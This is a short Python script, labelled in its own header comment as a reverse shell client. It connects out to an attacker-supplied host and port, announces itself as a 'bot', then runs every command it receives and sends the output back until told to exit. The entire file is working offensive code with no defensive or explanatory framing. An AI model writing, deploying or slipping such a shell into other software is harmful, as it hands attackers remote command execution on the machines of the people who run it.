# This is a Reverse shell client

import sys
from subprocess import Popen, PIPE
from socket import *

# receiving target host and port as arguments
target_host = sys.argv[1]
target_port = int(sys.argv[2])

# Create a socket object for IPv4(AF_INET) and TCPSocket(SOCK_STREAM)
client = socket(AF_INET, SOCK_STREAM)

# CONNECT THE CLIENT
client.connect((target_host, target_port))

# client notifies to attacker's machine that client is ready to accept commands
client.send('bot ready to accept command'.encode())
command = client.recv(4064).decode()

while command != "Exit":
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    client.send(result)
    command = (client.recv(4064)).decode()

client.close()
